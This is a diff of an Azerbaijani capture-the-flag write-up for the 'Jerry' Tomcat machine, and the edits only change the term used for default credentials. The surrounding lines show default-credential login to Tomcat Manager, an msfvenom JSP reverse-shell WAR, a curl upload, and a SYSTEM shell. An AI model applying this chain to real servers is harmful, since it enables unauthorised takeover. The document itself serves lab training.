@@ -14,8 +14,8 @@ Kəşfiyyat
 ├── nmap -p- --min-rate 5000 → 8080 (Apache Tomcat/Coyote JSP engine 1.1)
 └── /manager/html açıqdır (401 Unauthorized, Basic realm="Tomcat Manager Application")
 
-İlkin Giriş (Defolt Kredensiallar)
-├── Defolt kredensiallar tomcat:<PASSWORD> /manager/html-də → 200 OK
+İlkin Giriş (Standart Giriş Məlumatları)
+├── Standart giriş məlumatları tomcat:<PASSWORD> /manager/html-də → 200 OK
 ├── msfvenom -p java/jsp_shell_reverse_tcp → shell.war
 ├── curl -u tomcat:<PASSWORD> --upload-file shell.war → /shell-ə deploy
 └── JSP pеyload-unu işə salmaq → NT AUTHORITY\SYSTEM kimi reverse shell
@@ -33,7 +33,7 @@ Bayraqlar
 
 ## Maşın Brifinqi
 
-Jerry - Apache Tomcat 7.0.88 olan sadə Windows maşınıdır. Tomcat Manager tətbiqi Tomcat konfiqurasiya nümunələrində yaxşı sənədləşdirilmiş defolt kredensiallarla (`tomcat:<PASSWORD>`) qorunur. Autentifikasiyadan sonra menecer ixtiyari WAR (Web Application Archive) fayllarını yerləşdirməyə imkan verir. JSP reverse shell olan zərərli WAR yükləyərək hücumçu kod icrası əldə edir. Bu hostda Tomcat yüksək imtiyazlarla işlədiyi üçün shell `NT AUTHORITY\SYSTEM` kimi əldə edilir.
+Jerry - Apache Tomcat 7.0.88 olan sadə Windows maşınıdır. Tomcat Manager tətbiqi Tomcat konfiqurasiya nümunələrində yaxşı sənədləşdirilmiş standart giriş məlumatlarıla (`tomcat:<PASSWORD>`) qorunur. Autentifikasiyadan sonra menecer ixtiyari WAR (Web Application Archive) fayllarını yerləşdirməyə imkan verir. JSP reverse shell olan zərərli WAR yükləyərək hücumçu kod icrası əldə edir. Bu hostda Tomcat yüksək imtiyazlarla işlədiyi üçün shell `NT AUTHORITY\SYSTEM` kimi əldə edilir.
 
 ---
 
@@ -85,7 +85,7 @@ Bu, Tomcat Manager-in mövcud olduğunu və Basic autentifikasiya ilə qorunduğ
 
 No CVE (custom vulnerability) - the Apache Tomcat Manager is configured with default credentials `tomcat:<PASSWORD>`.
 
-### Defolt Kredensiallar
+### Standart Giriş Məlumatları
 
 Tomcat sənədləri və xəta mesajları bəzən bu cütlüyə nümunə kimi istinad edir. `/manager/html`-ə `tomcat:<PASSWORD>` ilə daxil olmaq cəhdi giriş verir:
 
@@ -222,7 +222,7 @@ root.txt
 
 ## Əsas Nəticələr
 
-- **Defolt kredensiallar kritik riskdir.** `tomcat:<PASSWORD>` cütlüyü Tomcat nümunələrində sənədləşdirilib; onu açıq menecer interfeysində dəyişmədən saxlamaq autentifikasiyanın olmamasına bərabərdir.
+- **Standart giriş məlumatları kritik riskdir.** `tomcat:<PASSWORD>` cütlüyü Tomcat nümunələrində sənədləşdirilib; onu açıq menecer interfeysində dəyişmədən saxlamaq autentifikasiyanın olmamasına bərabərdir.
 - **WAR deploy daxili funksiyadır, zəiflik deyil.** Tomcat Manager tətbiqləri yerləşdirmək üçün nəzərdə tutulub. Əgər hücumçu giriş əldə edərsə, bu funksiya istismar vektoruna çevrilir.
 - **Tomcat Windows-da tez-tez yüksək imtiyazlarla işləyir.** Tomcat vasitəsilə shell əldə etmək tez-tez `SYSTEM` verir və lokal səlahiyyət artımına ehtiyacı aradan qaldırır.
 - **Hər iki bayraq bir fayldadır.** Jerry hər iki bayrağı (user və root) bir faylda (`2 for the price of 1.txt`) yerləşdirir ki, bu da hücumçu üçün nadir rahatlıqdır.
